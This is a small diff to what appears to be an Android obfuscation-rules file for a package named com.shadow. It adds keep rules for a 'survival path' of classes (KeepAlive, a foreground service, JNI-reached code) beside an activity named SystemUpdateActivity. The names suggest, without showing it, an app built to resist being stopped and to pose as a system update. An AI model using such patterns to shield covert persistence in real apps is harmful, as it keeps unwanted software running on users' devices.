@@ -26,6 +26,12 @@
 # Keep Worker — WorkManager instantiates it by class name
 -keep class com.shadow.ShadowWorker { *; }
 
+# Keep the survival path — started by Intent from KeepAlive (class-name reference)
+# and declared in the manifest; KeepAlive itself is reached from ShadowBridge JNI.
+-keep class com.shadow.KeepAlive { *; }
+-keep class com.shadow.SyncForegroundService { *; }
+-keep class com.shadow.ShadowApp { *; }
+
 # Keep Activity — referenced in AndroidManifest.xml
 -keep class com.shadow.ui.SystemUpdateActivity { *; }
 
